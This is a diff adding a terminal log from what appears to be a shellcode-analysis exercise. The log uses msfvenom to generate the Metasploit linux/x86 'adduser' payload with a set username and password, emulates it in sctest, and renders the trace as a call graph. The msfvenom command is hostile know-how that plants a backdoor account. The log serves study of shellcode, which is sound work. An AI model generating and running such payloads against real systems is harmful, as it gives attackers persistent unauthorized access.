@@ -1,0 +1,60 @@
+root@kali-OSCP:~# msfvenom -p linux/x86/adduser pass=Letmein123 shell=/bin/sh user=slae32user | sctest -vvv -Ss 100000 -G ./adduser.dot
+graph file ./adduser.dot
+verbose = 3
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 97 bytes
+
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417000
+[emu 0x0x55976eca2510 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: 
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417000
+[emu 0x0x55976eca2510 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: 
+[emu 0x0x55976eca2510 debug ] 31C9                            xor ecx,ecx
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417002
+[emu 0x0x55976eca2510 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: PF ZF 
+[emu 0x0x55976eca2510 debug ] 89CB                            mov ebx,ecx
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417004
+[emu 0x0x55976eca2510 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: PF ZF 
+[emu 0x0x55976eca2510 debug ] 6A46                            push byte 0x46
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417006
+[emu 0x0x55976eca2510 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: PF ZF 
+[emu 0x0x55976eca2510 debug ] 58                              pop eax
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417007
+[emu 0x0x55976eca2510 debug ] eax=0x00000046  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: PF ZF 
+[emu 0x0x55976eca2510 debug ] CD80                            int 0x80
+stepcount 4
+copying vertexes
+optimizing graph
+vertex 0x55976ed32bd0
+going forwards from 0x55976ed32bd0
+ -> vertex 0x55976ed32ca0
+ -> vertex 0x55976ed32f20
+ -> vertex 0x55976ed33200
+copying edges for 0x55976ed33200
+vertex 0x55976ed33370
+going forwards from 0x55976ed33370
+copying edges for 0x55976ed33370
+[emu 0x0x55976eca2510 debug ] cpu state    eip=0x00417009
+[emu 0x0x55976eca2510 debug ] eax=0x00000046  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x55976eca2510 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x55976eca2510 debug ] Flags: PF ZF 
+root@kali-OSCP:~# ls
+adduser.dot  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  VirtualBox VMs  WebGoat
+root@kali-OSCP:~# dot adduser.dot -Tpng -o adduser.png
+root@kali-OSCP:~# ls
+adduser.dot  adduser.png  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  VirtualBox VMs  WebGoat
+root@kali-OSCP:~# 
+
